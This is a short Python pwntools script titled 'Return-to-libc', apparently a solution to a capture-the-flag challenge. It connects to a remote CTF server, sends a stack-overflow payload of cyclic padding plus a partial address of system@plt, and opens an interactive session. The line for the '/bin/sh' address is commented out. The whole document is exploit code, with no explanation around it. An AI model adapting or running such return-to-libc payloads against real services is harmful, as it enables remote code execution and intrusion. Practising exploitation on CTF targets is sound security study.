#Return-to-libc

from pwn import *
import struct

print(cyclic(100))

ip = 'ctf.adl.tw'
port = 11002

r = remote(ip, port)
# 0x400510
systemplt =  0x400510
# 0x400734
binsh = 0x400734
payload = "aaaabaaacaaadaaaeaaafaaa"
payload += "\x10\x05\x40"
#payload += "\x34\x07\x40"

r.sendline(payload)
r.interactive()

